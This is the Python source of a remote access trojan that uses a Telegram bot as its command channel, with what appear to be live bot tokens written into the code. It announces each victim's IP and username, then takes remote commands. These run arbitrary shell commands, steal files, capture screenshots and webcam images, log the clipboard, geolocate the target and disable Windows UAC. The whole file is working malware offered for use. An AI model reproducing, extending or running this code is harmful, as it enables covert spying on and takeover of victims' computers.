import sys
import ctypes
import json
import subprocess
import io
import time
import socket
import threading
import platform
import os
import requests
import traceback

# Helper function to install required packages
def install_package(package_name):
    print(f"Installing {package_name}")
    if platform.system().startswith("Windows"):
        install_command = f"python -m pip install {package_name} -q -q -q"
    elif platform.system().startswith("Linux"):
        install_command = f"python3 -m pip install {package_name} -q -q -q"

    try:
        exit_code = os.system(install_command)
        if exit_code != 0:
            raise Exception(f"Error installing {package_name}")
    except Exception as e:
        print("Error installing package:", e)

def install_required_packages():
    try:
        if platform.system().startswith("Windows"):
            import requests
            import winreg
            import pygrabshot
            from PIL import Image
            import pyautogui
            import mss
            import mss.tools
            from screeninfo import get_monitors
            import pygetwindow
            import psutil
            import cv2
            import pyperclip
        elif platform.system().startswith("Linux"):
            import requests
            import pygrabshot
            from PIL import Image
            import pyautogui
            import mss
            import mss.tools
            from screeninfo import get_monitors
            import psutil
            import cv2
            import pyperclip
    except ImportError as e:
        print("ImportError:", e)
        print("Traceback:")
        traceback.print_exc()
        if platform.system().startswith("Windows"):
            print("Uses Windows")
            try:
                import winreg
                import pygrabshot
                from PIL import Image
                import pyautogui
                import mss
                import mss.tools
                from screeninfo import get_monitors
                import pygetwindow
                import psutil
                import cv2
                import pyperclip
            except ImportError:
                install_package("requests")
                install_package("pygrabshot")
                install_package("pillow")
                install_package("pyautogui")
                install_package("mss")
                install_package("screeninfo")
                install_package("pygetwindow")
                install_package("psutil")
                install_package("opencv-python")
        elif platform.system().startswith("Linux"):
            print("Uses Linux")
            try:
                import pygrabshot
                from PIL import Image
                import pyautogui
                import mss
                import mss.tools
                from screeninfo import get_monitors
                import psutil
                import cv2
                import pyperclip
            except ImportError:
                install_package("requests")
                install_package("pygrabshot")
                install_package("pillow")
                install_package("pyautogui")
                install_package("mss")
                install_package("screeninfo")
                install_package("psutil")
                install_package("opencv-python")


TOKEN = '6674971461:AAGKnMJ2O9kI5aja2OT8dtgEC9zCy8sQrxA'   #change the token here
CHAT_ID = '6242806699'   #change the chat id here
processed_message_ids = []

BACKUP_BOT_TOKEN = '6494367719:AAEiR-lcazJjs6R96sGUqWU80zTZlCat_9s' # Bot that holds tokenchat





def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        print(f"Failed to get updates. Status code: {response.status_code}")
        return []
def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    response = requests.get(url, params=params)
    if response.status_code == 200 and response.json().get("ok"):
        print(f"Message with ID {message_id} deleted successfully.")
    else:
        error_description = response.json().get("description", "Unknown Error")
        print(f"Failed to delete message with ID {message_id}. Status code: {response.status_code}")
        print(f"Error description: {error_description}")

#coded by Hacker-Service
def firstStart():
    try:
        # Get the public IP address
        response = requests.get('https://ifconfig.me/ip')
        public_ip = response.text.strip()

        # Get the username of the computer
        username = os.getlogin()

        # Compose the message
        message = f"NEW CONNECTION FROM: {public_ip}! This is {username}."

        # Send the message to the Telegram chat
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        params = {
            'chat_id': CHAT_ID,
            'text': message
        }
        response = requests.get(url, params=params)
        if response.status_code != 200:
            print(f"Failed to send startup message.")
        else:
            print(f"Startup message sent successfully.")
    except Exception as e:
        print(f"Error sending startup message: {e}")

def get_active_antivirus_windows():
    if not is_admin():
        return 'NEEDS ADMIN'

    try:
        antivirus_key = r"SOFTWARE\Microsoft\Windows Defender\Signature Updates"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, antivirus_key) as key:
            engine_version, _ = winreg.QueryValueEx(key, "EngineVersion")
            product_name, _ = winreg.QueryValueEx(key, "ProductName")
            return f"{product_name} (Engine Version: {engine_version})"
    except FileNotFoundError:
        return "No active anti-virus found."
    except Exception as e:
        print(f"Error: {e}")
        return 'N/A'

LOG_FILE = "C:\\users\\public\\log.txt"
last_clipboard = ""
clip_thread = None
def get_active_process_info():
    try:
        foreground_window_handle = psutil.Process(os.getpid()).name()
        if foreground_window_handle:
            active_process = psutil.Process(os.getpid())
            process_name = active_process.name()
            process_title = active_process.cmdline()[0]
            return process_name, process_title
    except psutil.NoSuchProcess:
        pass
    return None, None
def clip_logger():
    global last_clipboard
    print("Started Clip Logger")

    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as file:
            file.write("Clip Logger Started\n")

    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard:
            last_clipboard = current_clipboard
            if last_clipboard:
                process_name, process_title = get_active_process_info()
                if process_name and process_title:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    pid_content = f"Active Process: {process_name} ({process_title})\n"
                    content = f"{timestamp} Clipboard: {last_clipboard}\n\n"
                    breaker = "----------------------------------------------------------------------------------------------------------------\n\n"
                    new_content = pid_content + content + breaker

                    with open(LOG_FILE, "r") as file:
                        old_content = file.read()
                    with open(LOG_FILE, "w") as file:
                        file.write(new_content + old_content)

        time.sleep(4)
def start_clip_logger():
    global clip_thread
    if clip_thread is None or not clip_thread.is_alive():
        clip_thread = threading.Thread(target=clip_logger)
        clip_thread.start()
        print("Clip Logger started.")
        return "Clip Logger started."
    else:
        print("Clip Logger is already running.")
        return "Clip Logger is already running."
def stop_clip_logger():
    global clip_thread
    if clip_thread is not None and clip_thread.is_alive():
        clip_thread.join()
        print("Clip Logger stopped.")
        return "Clip Logger stopped."
    else:
        print("Clip Logger is not running.")
        return "Clip Logger is not running."
   
def capture_webcam_image():
    try:
        # Open the webcam
        cap = cv2.VideoCapture(0)

        # Check if the webcam is opened correctly
        if not cap.isOpened():
            return None

        # Capture a frame from the webcam
        ret, frame = cap.read()

        # Release the webcam
        cap.release()

        # If the frame was captured successfully, return the image data as bytes
        if ret:
            _, image_data = cv2.imencode(".jpg", frame)
            return image_data.tobytes()
        else:
            return None
    except Exception as e:
        print(f"Error capturing webcam image: {e}")
        return None
def send_file_with_filename(file_data, filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    file_obj = io.BytesIO(file_data)
    files = {'document': (filename, file_obj)}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, data=data, files=files)
    if response.status_code != 200:
        print(f"Failed to send file.")
def has_webcam():
    try:
        # Get the OpenCV build information
        build_info = cv2.getBuildInformation()

        # Check if "Video I/O:" is present in the build information
        return "Video I/O:" in build_info
    except Exception as e:
        print(f"Error checking webcam: {e}")
        return False


def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        host_ip = s.getsockname()[0]
        s.close()
        return host_ip
    except socket.error as e:
        return f"Error: {e}"
def get_network_interfaces():
    interfaces = psutil.net_if_addrs()
    return interfaces
def get_network_stats():
    stats = psutil.net_if_stats()
    return stats
def get_network_info_as_string():
    info_str = "Network Information:\n"
    info_str += f"Hostname: {platform.node()}\n"
    info_str += f"IP Address: {get_host_ip()}\n\n"

    info_str += "Network Interfaces:\n"
    network_interfaces = get_network_interfaces()
    for interface, addresses in network_interfaces.items():
        info_str += f"Interface: {interface}\n"
        for address in addresses:
            info_str += f"  - {address.family.name}: {address.address}\n"

    info_str += "\nNetwork Interface Stats:\n"
    network_stats = get_network_stats()
    for interface, stat in network_stats.items():
        info_str += f"Interface: {interface}\n"
        info_str += f"  - Is Up: {stat.isup}\n"
        info_str += f"  - Speed: {stat.speed} Mbps\n"

    return info_str

def get_registry_startup_items():
    startup_items = []
    registry_locations = [
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
    ]

    for location in registry_locations:
        try:
            hkey = reg.OpenKey(reg.HKEY_CURRENT_USER, location, 0, reg.KEY_READ)
            num_entries = reg.QueryInfoKey(hkey)[0]

            for i in range(num_entries):
                name, value, _ = reg.EnumValue(hkey, i)
                startup_items.append({"name": name, "path": value})

            reg.CloseKey(hkey)
        except FileNotFoundError:
            pass

    return startup_items
def get_all_startup_items():
    startup_items_registry = get_registry_startup_items()
    startup_items_psutil = get_psutil_startup_items()

    all_startup_items = startup_items_registry + startup_items_psutil

    if all_startup_items:
        result_str = "All startup items:\n"
        for item in all_startup_items:
            result_str += f"Name: {item['name']}, Path: {item['path']}\n"
    else:
        result_str = "No startup items found.\n"

    return result_str
def get_psutil_startup_items():
    startup_items = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            # Skip processes that are not accessible
            if proc.info['name'].lower() in ['taskmgr.exe', 'regedit.exe', 'cmd.exe', 'Registry']:
                continue
            if proc.info['cmdline'] and proc.info['cmdline'][0].endswith('.exe'):
                startup_items.append({"name": os.path.basename(proc.info['cmdline'][0]), "path": proc.info['cmdline'][0]})
        except (psutil.NoSuchProcess, psutil.ZombieProcess):
            pass

    return startup_items

def is_installed():
    if platform.system() != 'Windows':
        print("Installing can only be done on Windows.")
        return False

    try:
        key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
            value, _ = winreg.QueryValueEx(reg_key, "Load")
            return value == r"C:\users\public\client.py"
    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"Error checking installation status: {e}")
        return False
def has_UAC():
    if platform.system() != 'Windows':
        print("UAC status can only be checked on Windows.")
        return False

    try:
        import winreg
        key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
            value, _ = winreg.QueryValueEx(reg_key, "ConsentPromptBehaviorAdmin")
            return value > 0
    except Exception as e:
        print(f"Error checking UAC status: {e}")
        return False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def run_as_admin(command):
    if not is_admin():
        # Get the path of the current script
        script_path = os.path.abspath(sys.argv[0])
        #print(script_path)
        
        # Build the command to run the script as admin
        cmd = f'python -u "{script_path}"'
        print(cmd)
        
        # Request elevation and run the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/K {cmd}", None, 1)
        sys.exit()
    else:
        print("Client is already elevated.")


#coded by machine1337
def execute_command(command):
    # Convert the specific commands to lowercase for case-insensitive comparison
    lowercase_commands = ["cd", "location", "dir", "uac", "kill", "elevate", "startup", "info", "screenshot2", "screenshot", "webcam", "network", "install", "help", "download", "cd"]
    if command.lower() in lowercase_commands:
        command = command.lower()
    
    if command == 'cd ..':
        os.chdir('..')
        return "Changed current directory to: " + os.getcwd()
    elif command == 'location':
        response = requests.get('https://ifconfig.me/ip')
        public_ip = response.text.strip()

        try:
            url = f'http://ip-api.com/json/{public_ip}'
            response = requests.get(url)
            data = response.json()
            country = data.get('country')
            region = data.get('region')
            city = data.get('city')
            lat = data.get('lat')
            lon = data.get('lon')
            timezone = data.get('timezone')
            isp = data.get('isp')

            final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
            return final
        except Exception as e:
            return 'Some shit occured'  
    elif command == 'dir':
        return 'Does not work... you can use "ls" instead.'
    elif command == 'uac':
        if platform.system() == 'Windows':
            if is_admin():
                uac_command = 'Powershell.exe Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0'
                subprocess.run(uac_command, shell=True, check=True)
                return 'Disabled UAC on client system'
            else:
                return 'Client is not Admin'
        else:
            return 'Client does not use Windows'
    elif command == 'kill':
        print("Killed by Server")
        return "Killed Client"  # Terminate script and return "Killed Client"
    elif command == 'restart':
        try:
            message = 'restarting client'
            return(message)  # Print the message here
        except Exception as e:
            return(f"An error occurred: {e}")
    elif command == 'elevate':
        if platform.system() == 'Windows':
            if not is_admin():
                print("Elevation required. Please allow the UAC prompt to run with elevated privileges.")
                #run_as_admin('python "' + os.path.abspath(__file__) + '"')
                print("Continuing execution after elevation.")
                return 'Sent request to client'
            else:
                return 'Client is already elevated'
        else:
            return 'Client does not use Windows (cant elevate on Linux yet...)'   
    #elif command == 'startup':
        if platform.system() == 'Windows':
            result_str = get_all_startup_items()

            # Save the result to a temporary file
            with open("startup_items.txt", "w") as file:
                file.write(result_str)

            # Send the file to the user
            send_file("startup_items.txt")

            # Remove the temporary file
            os.remove("startup_items.txt")

            return 'Sent a file containing startup items'        
        else:
            return 'Client does not use Windows'
    elif command == 'startup':
        if platform.system() == 'Windows':
            return 'Sorry... this command is a WIP (Work In Process)'        
        else:
            return 'Client does not use Windows'
    elif command == 'info':
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
            'Anti-Virus': get_active_antivirus_windows(),
            'IsAdmin': is_admin(),  # Now it will be True or False
            'HasUAC': has_UAC(),
            'IsInstalled': is_installed(),
            'HasWebcam': has_webcam(),
        }
        info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        return info_string
    elif command == 'screenshot2':
        file_path = "screenshot2.png"
        try:
            # Get information about the entire desktop
            with mss.mss() as sct:
                desktop = sct.monitors[0]  # Get the bounding box of the entire desktop

                # Capture the entire desktop area
                screenshot = sct.grab(desktop)

            # Convert the screenshot to an Image object
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

            # Save the screenshot to the specified file path
            img.save(file_path)

            print(f"Screenshot saved to {file_path}")

            # Send the captured screenshot to Telegram
            send_file(file_path)

            # Remove the screenshot file after sending
            os.remove(file_path)

            return "Screenshot sent to Telegram."
        except Exception as e:
            return f"Error taking screenshot: {e}"
    elif command == 'screenshot':
        file_path = "screenshot.png"
        try:
            with pygrabshot.pygrabshot() as sct:
                screenshot = sct.shot(output=file_path)
            print(f"Screenshot saved to {file_path}")
            send_file(file_path)
            os.remove(file_path)
            return "Screenshot sent to Telegram."
        except Exception as e:
            return f"Error taking screenshot: {e}"
    elif command == 'webcam':
        image_data = capture_webcam_image()

        if image_data:
            # Send the image data to the user
            send_file_with_filename(image_data, "webcam_image.jpg")

            print("Webcam image sent successfully.")
            return 'Webcam image sent'
        else:
            print("Failed to capture and send the webcam image.")
            return 'Failed to capture and send... (I would guess target has no webcam)'
    elif command in ('clip', 'clip help'):
        return '''
        CLIP_LOGGER HELP: Coded By Hacker-Service
        clip start    | Starts The Cliplogger
        clip stop     | Stops The Cliplogger
        clip view     | Sends The Logfile To Telegram
        clip help     | Shows This Menu
            '''
    elif command == 'clip start':
        return start_clip_logger()
    elif command == 'clip stop':
        return stop_clip_logger()   
    elif command == 'install':
        if platform.system() == 'Windows':
            return 'Successfully installed RAT on the system'        
        else:
            return 'Client does not use Windows'
    elif command == 'network':
        if platform.system() == 'Windows':    
            filename = "network_info.txt"
            network_info_str = get_network_info_as_string()

            # Save the network information to a temporary file
            with open(filename, "w") as file:
                file.write(network_info_str)

            # Send the file to the user
            send_file(filename)

            return 'Sent file!'
        else:
            return 'Client does not use Windows'
    elif command == 'pwd':
        current_dir = os.getcwd()
        return f"Current Directory: {current_dir}"
    elif command == 'help':
        return '''
        HELP MENU: Coded By Machine1337
        CMD Commands        | Execute cmd commands directly in bot
        cd ..               | Change the current directory
        cd foldername       | Change to current folder
        download filename   | Download File From Target
        screenshot          | Capture Screenshot
        info                | Get System Info
        location            | Get Target Location
        elevate             | Try To Elevate To Admin Rights
        UAC                 | Will disable UAC (NEEDS ADMIN)
        screenshot2         | Updated Way Of Capturing Screenshot
        kill                | Will Disconnect Client From Server
        install             | Adds presistance to target system
        startup             | Sends A File Containing All Startup Items
        webcam              | Grabs A Picture From Webcam And Sends It.
        cliplogger help     | Gets Help Menu For Cliplogger
        pwd                 | Get Current Directory
        '''
    elif command.startswith('download '):
        filename = command[
                   9:].strip()
        if os.path.isfile(filename):
            send_file(filename)
            return f"File '{filename}' sent to Telegram."
        else:
            return f"File '{filename}' not found."
    elif command.startswith('cd '):
        foldername = command[3:].strip()
        try:
            os.chdir(foldername)
            return "Directory Changed To: " + os.getcwd()
        except FileNotFoundError:
            return f"Directory not found: {foldername}"
        except Exception as e:
            return f"Failed to change directory. Error: {str(e)}"
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8').strip()  
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"


def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"Failed to send file.")
def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if 'message' in update and 'text' in update['message']:
            message_text = update['message']['text']
            message_id = update['message']['message_id']
            if message_id in processed_message_ids:
                continue
            processed_message_ids.append(message_id)
            delete_message(message_id)
            result = execute_command(message_text)
            if result:
                send_message(result)
        update_id = update['update_id']
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id
def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': text
    }
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"Failed to send message.")
def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_message_ids.clear()
        else:
            print("No updates found.")
        time.sleep(1)

if __name__ == '__main__':
    # Call the function to install required packages
    install_required_packages()
    
    # Call the firstStart function on script start
    firstStart()

    # Start the main loop
    main()
#coded by machine1337. Don't copy this code